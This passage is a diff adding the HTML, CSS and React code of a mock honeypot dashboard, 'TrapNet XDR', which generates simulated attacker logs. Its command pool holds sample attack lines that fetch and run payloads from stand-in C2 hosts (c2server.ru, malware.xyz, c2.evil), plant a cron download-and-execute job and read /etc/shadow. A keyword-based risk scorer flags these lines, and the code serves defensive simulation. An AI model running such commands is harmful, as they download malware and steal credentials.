@@ -1,0 +1,2326 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>TrapNet XDR — Honeypot Platform</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/react/18.2.0/umd/react.production.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/react-dom/18.2.0/umd/react-dom.production.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/babel-standalone/7.23.2/babel.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.1/chart.umd.min.js"></script>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;500;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
+<style>
+  :root {
+    --bg0: #020408;
+    --bg1: #060d14;
+    --bg2: #0a1520;
+    --bg3: #0f1e2e;
+    --panel: #0d1a27;
+    --border: #1a3040;
+    --accent: #00d4ff;
+    --accent2: #ff3c6e;
+    --accent3: #39ff14;
+    --accent4: #ff9f00;
+    --text: #c8e6f5;
+    --text-dim: #4a7a99;
+    --critical: #ff3c6e;
+    --high: #ff9f00;
+    --medium: #ffe600;
+    --low: #39ff14;
+    --glow: 0 0 20px rgba(0,212,255,0.3);
+    --glow-red: 0 0 20px rgba(255,60,110,0.4);
+  }
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  html { scroll-behavior: smooth; }
+  body {
+    background: var(--bg0);
+    color: var(--text);
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 15px;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background:
+      radial-gradient(ellipse 60% 40% at 10% 20%, rgba(0,212,255,0.04) 0%, transparent 60%),
+      radial-gradient(ellipse 40% 30% at 90% 80%, rgba(255,60,110,0.04) 0%, transparent 60%);
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  /* Scanline overlay */
+  body::after {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,0,0,0.08) 2px,
+      rgba(0,0,0,0.08) 4px
+    );
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  /* ── LAYOUT ── */
+  #root { display: flex; min-height: 100vh; position: relative; z-index: 1; }
+  .sidebar {
+    width: 240px;
+    background: var(--bg1);
+    border-right: 1px solid var(--border);
+    display: flex;
+    flex-direction: column;
+    position: fixed;
+    top: 0; left: 0; bottom: 0;
+    z-index: 100;
+    padding: 0;
+  }
+  .main-content {
+    margin-left: 240px;
+    flex: 1;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+  }
+
+  /* ── SIDEBAR ── */
+  .logo-area {
+    padding: 24px 20px 20px;
+    border-bottom: 1px solid var(--border);
+    position: relative;
+  }
+  .logo-title {
+    font-family: 'Orbitron', monospace;
+    font-size: 18px;
+    font-weight: 900;
+    color: var(--accent);
+    letter-spacing: 2px;
+    text-shadow: 0 0 20px var(--accent);
+  }
+  .logo-sub {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: var(--text-dim);
+    letter-spacing: 3px;
+    margin-top: 2px;
+  }
+  .logo-badge {
+    display: inline-block;
+    background: rgba(57,255,20,0.15);
+    border: 1px solid var(--accent3);
+    color: var(--accent3);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 9px;
+    padding: 2px 8px;
+    letter-spacing: 2px;
+    margin-top: 8px;
+    animation: blink 2s ease-in-out infinite;
+  }
+  @keyframes blink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.4; }
+  }
+  .nav-section {
+    padding: 16px 12px 8px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 9px;
+    color: var(--text-dim);
+    letter-spacing: 3px;
+    text-transform: uppercase;
+  }
+  .nav-item {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 10px 20px;
+    cursor: pointer;
+    font-size: 13px;
+    font-weight: 500;
+    letter-spacing: 1px;
+    color: var(--text-dim);
+    transition: all 0.2s;
+    position: relative;
+    text-decoration: none;
+    border: none;
+    background: none;
+    width: 100%;
+    text-align: left;
+  }
+  .nav-item:hover { color: var(--text); background: rgba(0,212,255,0.05); }
+  .nav-item.active {
+    color: var(--accent);
+    background: rgba(0,212,255,0.08);
+  }
+  .nav-item.active::before {
+    content: '';
+    position: absolute;
+    left: 0; top: 0; bottom: 0;
+    width: 2px;
+    background: var(--accent);
+    box-shadow: 0 0 10px var(--accent);
+  }
+  .nav-icon { font-size: 16px; width: 20px; text-align: center; }
+  .nav-badge {
+    margin-left: auto;
+    background: var(--accent2);
+    color: white;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    padding: 1px 6px;
+    border-radius: 2px;
+    min-width: 20px;
+    text-align: center;
+  }
+  .sidebar-bottom {
+    margin-top: auto;
+    padding: 16px;
+    border-top: 1px solid var(--border);
+  }
+  .threat-level-bar {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    padding: 10px 12px;
+    border-radius: 2px;
+  }
+  .threat-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 9px;
+    color: var(--text-dim);
+    letter-spacing: 2px;
+    margin-bottom: 6px;
+  }
+  .threat-value {
+    font-family: 'Orbitron', monospace;
+    font-size: 20px;
+    font-weight: 700;
+    color: var(--accent2);
+    text-shadow: 0 0 15px var(--accent2);
+  }
+  .threat-bar-track {
+    height: 4px;
+    background: var(--bg0);
+    margin-top: 6px;
+    border-radius: 2px;
+    overflow: hidden;
+  }
+  .threat-bar-fill {
+    height: 100%;
+    background: linear-gradient(90deg, var(--accent3), var(--accent4), var(--accent2));
+    border-radius: 2px;
+    transition: width 1s ease;
+    box-shadow: 0 0 10px var(--accent2);
+  }
+
+  /* ── TOP BAR ── */
+  .topbar {
+    height: 54px;
+    background: var(--bg1);
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    padding: 0 28px;
+    gap: 16px;
+    flex-shrink: 0;
+  }
+  .topbar-title {
+    font-family: 'Orbitron', monospace;
+    font-size: 14px;
+    font-weight: 700;
+    color: var(--accent);
+    letter-spacing: 2px;
+    flex: 1;
+  }
+  .topbar-time {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    color: var(--text-dim);
+  }
+  .status-dot {
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: var(--accent3);
+    box-shadow: 0 0 8px var(--accent3);
+    animation: pulse 2s ease-in-out infinite;
+  }
+  @keyframes pulse {
+    0%, 100% { transform: scale(1); opacity: 1; }
+    50% { transform: scale(1.3); opacity: 0.7; }
+  }
+
+  /* ── PAGE ── */
+  .page { padding: 28px; flex: 1; }
+  .page-header {
+    margin-bottom: 28px;
+    display: flex;
+    align-items: flex-end;
+    gap: 16px;
+  }
+  .page-title {
+    font-family: 'Orbitron', monospace;
+    font-size: 22px;
+    font-weight: 700;
+    color: var(--accent);
+    letter-spacing: 2px;
+  }
+  .page-subtitle {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--text-dim);
+    letter-spacing: 2px;
+    margin-top: 4px;
+  }
+  .page-actions { margin-left: auto; display: flex; gap: 10px; }
+
+  /* ── CARDS ── */
+  .card {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 2px;
+    padding: 20px;
+    position: relative;
+    overflow: hidden;
+  }
+  .card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, var(--accent), transparent);
+    opacity: 0.4;
+  }
+  .card-title {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: var(--text-dim);
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    margin-bottom: 12px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .card-title-icon { font-size: 14px; }
+
+  /* ── STAT CARDS ── */
+  .stat-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px; margin-bottom: 24px; }
+  .stat-card {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    padding: 20px;
+    position: relative;
+    overflow: hidden;
+    cursor: default;
+    transition: border-color 0.2s, transform 0.2s;
+  }
+  .stat-card:hover { border-color: var(--accent); transform: translateY(-2px); }
+  .stat-card::after {
+    content: '';
+    position: absolute;
+    bottom: 0; left: 0; right: 0;
+    height: 2px;
+    background: linear-gradient(90deg, transparent, var(--c, var(--accent)), transparent);
+  }
+  .stat-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 9px;
+    color: var(--text-dim);
+    letter-spacing: 3px;
+    margin-bottom: 10px;
+  }
+  .stat-value {
+    font-family: 'Orbitron', monospace;
+    font-size: 32px;
+    font-weight: 900;
+    color: var(--c, var(--accent));
+    text-shadow: 0 0 20px var(--c, var(--accent));
+    line-height: 1;
+  }
+  .stat-delta {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: var(--text-dim);
+    margin-top: 6px;
+  }
+  .stat-icon {
+    position: absolute;
+    top: 16px; right: 16px;
+    font-size: 28px;
+    opacity: 0.15;
+  }
+
+  /* ── GRID LAYOUTS ── */
+  .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+  .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 16px; }
+  .grid-2-1 { display: grid; grid-template-columns: 2fr 1fr; gap: 16px; }
+  .grid-1-2 { display: grid; grid-template-columns: 1fr 2fr; gap: 16px; }
+  .mb-4 { margin-bottom: 16px; }
+  .mb-6 { margin-bottom: 24px; }
+
+  /* ── TABLE ── */
+  .data-table { width: 100%; border-collapse: collapse; }
+  .data-table th {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 9px;
+    letter-spacing: 2px;
+    color: var(--text-dim);
+    text-align: left;
+    padding: 8px 12px;
+    border-bottom: 1px solid var(--border);
+    text-transform: uppercase;
+  }
+  .data-table td {
+    padding: 10px 12px;
+    border-bottom: 1px solid rgba(26,48,64,0.5);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    color: var(--text);
+    vertical-align: middle;
+  }
+  .data-table tr:hover td { background: rgba(0,212,255,0.03); }
+  .data-table tr:last-child td { border-bottom: none; }
+
+  /* ── BADGES ── */
+  .badge {
+    display: inline-block;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 9px;
+    letter-spacing: 1px;
+    padding: 2px 8px;
+    border-radius: 1px;
+    font-weight: 700;
+  }
+  .badge-critical { background: rgba(255,60,110,0.15); color: var(--critical); border: 1px solid var(--critical); }
+  .badge-high     { background: rgba(255,159,0,0.15);  color: var(--high);     border: 1px solid var(--high); }
+  .badge-medium   { background: rgba(255,230,0,0.15);  color: var(--medium);   border: 1px solid var(--medium); }
+  .badge-low      { background: rgba(57,255,20,0.15);  color: var(--low);      border: 1px solid var(--low); }
+  .badge-ssh      { background: rgba(0,212,255,0.1);   color: var(--accent);   border: 1px solid var(--accent); }
+  .badge-http     { background: rgba(147,51,234,0.15); color: #a855f7;         border: 1px solid #a855f7; }
+
+  /* ── BUTTONS ── */
+  .btn {
+    font-family: 'Rajdhani', sans-serif;
+    font-weight: 600;
+    font-size: 12px;
+    letter-spacing: 2px;
+    padding: 8px 18px;
+    border: 1px solid;
+    cursor: pointer;
+    transition: all 0.2s;
+    text-transform: uppercase;
+    border-radius: 1px;
+  }
+  .btn-primary {
+    background: rgba(0,212,255,0.1);
+    border-color: var(--accent);
+    color: var(--accent);
+  }
+  .btn-primary:hover { background: rgba(0,212,255,0.2); box-shadow: var(--glow); }
+  .btn-danger {
+    background: rgba(255,60,110,0.1);
+    border-color: var(--critical);
+    color: var(--critical);
+  }
+  .btn-danger:hover { background: rgba(255,60,110,0.2); box-shadow: var(--glow-red); }
+  .btn-ghost {
+    background: transparent;
+    border-color: var(--border);
+    color: var(--text-dim);
+  }
+  .btn-ghost:hover { border-color: var(--accent); color: var(--accent); }
+
+  /* ── INPUTS ── */
+  .input-field {
+    background: var(--bg0);
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    padding: 10px 14px;
+    width: 100%;
+    outline: none;
+    transition: border-color 0.2s;
+    border-radius: 1px;
+  }
+  .input-field:focus { border-color: var(--accent); box-shadow: 0 0 0 1px rgba(0,212,255,0.2); }
+  .input-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: var(--text-dim);
+    letter-spacing: 2px;
+    margin-bottom: 6px;
+    display: block;
+  }
+  .form-group { margin-bottom: 16px; }
+
+  /* ── CHART CONTAINER ── */
+  .chart-wrap { position: relative; height: 220px; }
+  .chart-wrap-sm { position: relative; height: 160px; }
+  .chart-wrap-lg { position: relative; height: 300px; }
+
+  /* ── ALERTS ── */
+  .alert-item {
+    display: flex;
+    gap: 14px;
+    padding: 14px 16px;
+    border-left: 3px solid;
+    background: rgba(255,60,110,0.05);
+    margin-bottom: 10px;
+    position: relative;
+    transition: background 0.2s;
+  }
+  .alert-item:hover { background: rgba(255,60,110,0.08); }
+  .alert-item.ack { opacity: 0.4; border-left-color: var(--border) !important; }
+  .alert-critical { border-left-color: var(--critical); }
+  .alert-high     { border-left-color: var(--high); }
+  .alert-medium   { border-left-color: var(--medium); }
+  .alert-icon { font-size: 20px; }
+  .alert-body { flex: 1; }
+  .alert-title { font-weight: 600; font-size: 14px; color: var(--text); margin-bottom: 3px; }
+  .alert-desc  { font-family: 'Share Tech Mono', monospace; font-size: 11px; color: var(--text-dim); }
+  .alert-time  { font-family: 'Share Tech Mono', monospace; font-size: 10px; color: var(--text-dim); margin-top: 4px; }
+  .alert-ack-btn {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    padding: 4px 10px;
+    background: transparent;
+    border: 1px solid var(--border);
+    color: var(--text-dim);
+    cursor: pointer;
+    transition: all 0.2s;
+    align-self: center;
+    white-space: nowrap;
+  }
+  .alert-ack-btn:hover { border-color: var(--accent3); color: var(--accent3); }
+
+  /* ── HONEYPOT PAGE ── */
+  .honeypot-wrapper {
+    min-height: calc(100vh - 54px);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 40px;
+    position: relative;
+  }
+  .honeypot-disclaimer {
+    position: absolute;
+    top: 20px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: rgba(255,230,0,0.1);
+    border: 1px solid var(--medium);
+    color: var(--medium);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    padding: 6px 16px;
+    letter-spacing: 2px;
+    z-index: 10;
+  }
+  .login-panel {
+    width: 420px;
+    background: var(--panel);
+    border: 1px solid var(--border);
+    position: relative;
+    overflow: hidden;
+  }
+  .login-panel::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 2px;
+    background: linear-gradient(90deg, var(--accent2), var(--accent), var(--accent2));
+    box-shadow: 0 0 20px var(--accent);
+  }
+  .login-header {
+    padding: 28px 32px 20px;
+    border-bottom: 1px solid var(--border);
+    text-align: center;
+  }
+  .login-brand {
+    font-family: 'Orbitron', monospace;
+    font-size: 14px;
+    font-weight: 700;
+    color: var(--text-dim);
+    letter-spacing: 4px;
+    margin-bottom: 4px;
+  }
+  .login-service-badge {
+    display: inline-block;
+    background: rgba(255,60,110,0.1);
+    border: 1px solid var(--accent2);
+    color: var(--accent2);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    padding: 3px 12px;
+    letter-spacing: 2px;
+    margin-bottom: 8px;
+  }
+  .login-form { padding: 28px 32px 24px; }
+  .login-error {
+    background: rgba(255,60,110,0.1);
+    border: 1px solid var(--critical);
+    color: var(--critical);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    padding: 10px 14px;
+    margin-bottom: 16px;
+    letter-spacing: 1px;
+  }
+  .login-success {
+    background: rgba(57,255,20,0.1);
+    border: 1px solid var(--accent3);
+    color: var(--accent3);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    padding: 10px 14px;
+    margin-bottom: 16px;
+    letter-spacing: 1px;
+  }
+  .terminal-window {
+    background: var(--bg0);
+    border: 1px solid var(--border);
+    margin-top: 24px;
+  }
+  .terminal-titlebar {
+    background: var(--bg2);
+    padding: 8px 14px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    border-bottom: 1px solid var(--border);
+  }
+  .term-dot { width: 10px; height: 10px; border-radius: 50%; }
+  .term-dot-r { background: var(--critical); }
+  .term-dot-y { background: var(--medium); }
+  .term-dot-g { background: var(--accent3); }
+  .terminal-title { font-family: 'Share Tech Mono', monospace; font-size: 11px; color: var(--text-dim); margin-left: 8px; }
+  .terminal-body { padding: 14px; min-height: 180px; max-height: 260px; overflow-y: auto; }
+  .term-line {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    line-height: 1.7;
+    color: var(--accent3);
+  }
+  .term-prompt { color: var(--accent); }
+  .term-output { color: var(--text-dim); }
+  .term-input-row { display: flex; align-items: center; gap: 6px; margin-top: 4px; }
+  .term-input {
+    background: transparent;
+    border: none;
+    outline: none;
+    color: var(--accent3);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    flex: 1;
+    caret-color: var(--accent3);
+  }
+
+  /* ── HOME PAGE ── */
+  .home-hero {
+    text-align: center;
+    padding: 60px 40px 40px;
+    position: relative;
+  }
+  .home-hero-title {
+    font-family: 'Orbitron', monospace;
+    font-size: 48px;
+    font-weight: 900;
+    color: var(--accent);
+    text-shadow: 0 0 40px var(--accent), 0 0 80px rgba(0,212,255,0.3);
+    letter-spacing: 4px;
+    line-height: 1.1;
+    animation: flicker 8s ease-in-out infinite;
+  }
+  @keyframes flicker {
+    0%, 95%, 100% { opacity: 1; }
+    96% { opacity: 0.8; }
+    97% { opacity: 1; }
+    98% { opacity: 0.7; }
+    99% { opacity: 1; }
+  }
+  .home-hero-sub {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 14px;
+    color: var(--text-dim);
+    letter-spacing: 4px;
+    margin-top: 12px;
+  }
+  .home-hero-desc {
+    max-width: 560px;
+    margin: 20px auto 0;
+    font-size: 15px;
+    color: var(--text-dim);
+    line-height: 1.6;
+  }
+  .feature-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; margin-top: 40px; }
+  .feature-card {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    padding: 24px;
+    position: relative;
+    overflow: hidden;
+    transition: border-color 0.3s, transform 0.3s;
+  }
+  .feature-card:hover { border-color: var(--accent); transform: translateY(-4px); }
+  .feature-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, var(--accent), transparent);
+    opacity: 0;
+    transition: opacity 0.3s;
+  }
+  .feature-card:hover::before { opacity: 1; }
+  .feature-icon { font-size: 32px; margin-bottom: 14px; }
+  .feature-title { font-family: 'Orbitron', monospace; font-size: 13px; font-weight: 700; color: var(--accent); letter-spacing: 1px; margin-bottom: 8px; }
+  .feature-desc { font-size: 13px; color: var(--text-dim); line-height: 1.5; }
+
+  /* ── MITRE TAGS ── */
+  .mitre-tag {
+    display: inline-block;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    padding: 2px 8px;
+    background: rgba(0,212,255,0.1);
+    border: 1px solid rgba(0,212,255,0.3);
+    color: var(--accent);
+    margin: 2px;
+  }
+
+  /* ── RISK BAR ── */
+  .risk-bar-track {
+    height: 6px;
+    background: var(--bg0);
+    border-radius: 3px;
+    overflow: hidden;
+    position: relative;
+  }
+  .risk-bar-fill {
+    height: 100%;
+    border-radius: 3px;
+    transition: width 0.8s ease;
+  }
+
+  /* ── PROGRESS ── */
+  .progress-row {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 10px;
+  }
+  .progress-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--text-dim);
+    width: 120px;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+  .progress-bar {
+    flex: 1;
+    height: 4px;
+    background: var(--bg0);
+    border-radius: 2px;
+    overflow: hidden;
+  }
+  .progress-fill {
+    height: 100%;
+    background: linear-gradient(90deg, var(--accent), var(--accent2));
+    border-radius: 2px;
+  }
+  .progress-count {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--text);
+    width: 30px;
+    text-align: right;
+  }
+
+  /* ── FILTER BAR ── */
+  .filter-bar {
+    display: flex;
+    gap: 10px;
+    margin-bottom: 16px;
+    align-items: center;
+    flex-wrap: wrap;
+  }
+  .filter-select {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    padding: 6px 12px;
+    outline: none;
+    cursor: pointer;
+  }
+  .filter-select:focus { border-color: var(--accent); }
+
+  /* ── TICKER ── */
+  .ticker-wrap {
+    overflow: hidden;
+    border-top: 1px solid var(--border);
+    border-bottom: 1px solid var(--border);
+    background: var(--bg1);
+    padding: 6px 0;
+  }
+  .ticker-inner {
+    display: flex;
+    gap: 60px;
+    animation: ticker 30s linear infinite;
+    white-space: nowrap;
+  }
+  @keyframes ticker {
+    0%   { transform: translateX(0); }
+    100% { transform: translateX(-50%); }
+  }
+  .ticker-item {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--text-dim);
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .ticker-dot { width: 6px; height: 6px; border-radius: 50%; background: var(--accent2); display: inline-block; }
+
+  /* ── WORLD MAP (SVG) ── */
+  .world-map-container {
+    background: var(--bg0);
+    border: 1px solid var(--border);
+    padding: 16px;
+    position: relative;
+    overflow: hidden;
+  }
+  .map-dot {
+    position: absolute;
+    border-radius: 50%;
+    transform: translate(-50%, -50%);
+    cursor: pointer;
+    transition: transform 0.2s;
+  }
+  .map-dot:hover { transform: translate(-50%, -50%) scale(1.5); }
+  .map-dot::after {
+    content: '';
+    position: absolute;
+    inset: -4px;
+    border-radius: 50%;
+    border: 1px solid currentColor;
+    animation: ripple 2s ease-out infinite;
+    opacity: 0.5;
+  }
+  @keyframes ripple {
+    0%   { transform: scale(1); opacity: 0.5; }
+    100% { transform: scale(2.5); opacity: 0; }
+  }
+
+  /* ── ADMIN PANEL ── */
+  .admin-section {
+    border: 1px solid var(--border);
+    background: var(--panel);
+    margin-bottom: 20px;
+  }
+  .admin-section-header {
+    padding: 14px 20px;
+    border-bottom: 1px solid var(--border);
+    background: var(--bg2);
+    font-family: 'Orbitron', monospace;
+    font-size: 11px;
+    letter-spacing: 2px;
+    color: var(--accent);
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .admin-section-body { padding: 20px; }
+  .toggle-row {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 10px 0;
+    border-bottom: 1px solid rgba(26,48,64,0.4);
+  }
+  .toggle-row:last-child { border-bottom: none; }
+  .toggle-label { font-size: 13px; color: var(--text); font-weight: 500; }
+  .toggle-sub { font-family: 'Share Tech Mono', monospace; font-size: 10px; color: var(--text-dim); margin-top: 2px; }
+  .toggle-switch {
+    width: 40px; height: 20px;
+    background: var(--bg0);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    position: relative;
+    cursor: pointer;
+    transition: background 0.2s;
+    flex-shrink: 0;
+  }
+  .toggle-switch.on { background: rgba(0,212,255,0.2); border-color: var(--accent); }
+  .toggle-switch::after {
+    content: '';
+    position: absolute;
+    width: 14px; height: 14px;
+    border-radius: 50%;
+    background: var(--text-dim);
+    top: 2px; left: 2px;
+    transition: transform 0.2s, background 0.2s;
+  }
+  .toggle-switch.on::after { transform: translateX(20px); background: var(--accent); }
+
+  /* ── SCROLLBAR ── */
+  ::-webkit-scrollbar { width: 4px; height: 4px; }
+  ::-webkit-scrollbar-track { background: var(--bg0); }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--accent); }
+
+  /* ── ANIMATIONS ── */
+  .fade-in { animation: fadeIn 0.3s ease; }
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(8px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+  .spin { animation: spin 1s linear infinite; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* ── TOOLTIP ── */
+  [data-tip] { position: relative; }
+  [data-tip]:hover::after {
+    content: attr(data-tip);
+    position: absolute;
+    bottom: 100%;
+    left: 50%;
+    transform: translateX(-50%);
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    padding: 4px 10px;
+    white-space: nowrap;
+    pointer-events: none;
+    z-index: 999;
+    margin-bottom: 4px;
+  }
+
+  /* ── RESPONSIVE ── */
+  @media (max-width: 1100px) {
+    .stat-grid { grid-template-columns: repeat(2, 1fr); }
+    .grid-2 { grid-template-columns: 1fr; }
+    .grid-2-1 { grid-template-columns: 1fr; }
+    .grid-1-2 { grid-template-columns: 1fr; }
+    .feature-grid { grid-template-columns: 1fr 1fr; }
+  }
+</style>
+</head>
+<body>
+<div id="root"></div>
+
+<script type="text/babel">
+const { useState, useEffect, useRef, useCallback } = React;
+
+// ─── Mock API (self-contained, no server needed) ─────────────────────────────
+const GEO_DATA = {
+  "185.220.101.47": { country: "Russia",       city: "Moscow",       lat: 55.75, lon: 37.61, flag: "🇷🇺" },
+  "45.142.212.100": { country: "Germany",      city: "Frankfurt",    lat: 50.11, lon: 8.68,  flag: "🇩🇪" },
+  "103.75.190.5":   { country: "China",        city: "Beijing",      lat: 39.90, lon: 116.40, flag: "🇨🇳" },
+  "91.108.4.1":     { country: "Netherlands",  city: "Amsterdam",    lat: 52.36, lon: 4.90,  flag: "🇳🇱" },
+  "196.196.53.100": { country: "Iran",         city: "Tehran",       lat: 35.68, lon: 51.38, flag: "🇮🇷" },
+  "5.188.206.14":   { country: "Ukraine",      city: "Kyiv",         lat: 50.45, lon: 30.52, flag: "🇺🇦" },
+  "104.21.48.100":  { country: "USA",          city: "San Jose",     lat: 37.33, lon: -121.88, flag: "🇺🇸" },
+  "123.57.12.20":   { country: "India",        city: "Mumbai",       lat: 19.07, lon: 72.87, flag: "🇮🇳" },
+  "177.66.10.45":   { country: "Brazil",       city: "São Paulo",    lat: -23.55, lon: -46.63, flag: "🇧🇷" },
+  "41.204.18.7":    { country: "Nigeria",      city: "Lagos",        lat: 6.52, lon: 3.37,   flag: "🇳🇬" },
+};
+
+const CREDS = [
+  ["admin","admin"],["root","root"],["admin","password"],["user","123456"],
+  ["admin","1234"],["root","toor"],["administrator","admin"],["test","test"],
+  ["guest","guest"],["admin","admin123"],["root","password123"],["ubuntu","ubuntu"],
+  ["pi","raspberry"],["oracle","oracle"],["postgres","postgres"],["admin","letmein"],
+  ["root","123456"],["admin","12345"],["user","password"],["root","pass"],
+];
+
+const COMMANDS_POOL = [
+  "whoami","id","uname -a","cat /etc/passwd","ls -la /","ifconfig",
+  "netstat -an","ps aux","wget http://malware.xyz/bot",
+  "curl http://c2server.ru/payload -o /tmp/x && chmod +x /tmp/x && /tmp/x",
+  "cat /etc/shadow","find / -perm -4000","echo '* * * * * curl http://c2.evil/cron|sh'>>cron",
+  "history","last -n 20","w","nmap -sV 192.168.1.0/24",
+];
+
+const MITRE_POOL = ["T1110","T1059","T1078","T1136","T1053","T1548","T1071","T1003","T1055","T1562"];
+const USERAGENTS = [
+  "Masscan/1.0","zgrab/0.x","python-requests/2.28",
+  "Go-http-client/1.1","curl/7.68.0","Nikto/2.1.6","sqlmap/1.7",
+];
+
+function rnd(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
+function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
+function sample(arr, n) { return [...arr].sort(() => Math.random() - 0.5).slice(0, n); }
+
+const IPS = Object.keys(GEO_DATA);
+const KNOWN_BAD = new Set(["185.220.101.47","103.75.190.5","196.196.53.100","41.204.18.7","5.188.206.14"]);
+
+function computeRisk(ip, attempts, commands) {
+  let score = 0;
+  if (KNOWN_BAD.has(ip)) score += 40;
+  score += Math.min(attempts * 3, 30);
+  const dangerous = commands.filter(c => ["wget","curl","rm -rf","/etc/shadow","cron","nmap"].some(d => c.includes(d)));
+  score += Math.min(dangerous.length * 10, 30);
+  score = Math.min(score, 100);
+  const level = score >= 75 ? "CRITICAL" : score >= 50 ? "HIGH" : score >= 25 ? "MEDIUM" : "LOW";
+  return { score, level };
+}
+
+function generateLogs(n = 150) {
+  const now = Date.now();
+  return Array.from({ length: n }, (_, i) => {
+    const ip = pick(IPS);
+    const cred = pick(CREDS);
+    const geo = GEO_DATA[ip];
+    const cmds = Math.random() > 0.55 ? sample(COMMANDS_POOL, rnd(0, 4)) : [];
+    const attempts = rnd(1, 20);
+    const risk = computeRisk(ip, attempts, cmds);
+    return {
+      id: `log-${i}-${Math.random().toString(36).slice(2,8)}`,
+      attacker_ip: ip,
+      timestamp: new Date(now - rnd(0, 86400000 * 7)).toISOString(),
+      service: Math.random() > 0.45 ? "ssh" : "http",
+      username: cred[0],
+      password: cred[1],
+      commands: cmds,
+      geo,
+      risk,
+      headers: { "User-Agent": pick(USERAGENTS), Accept: "*/*" },
+      mitre_tags: sample(MITRE_POOL, rnd(1, 3)),
+      attempts,
+    };
+  }).sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+}
+
+function generateAlerts(logs) {
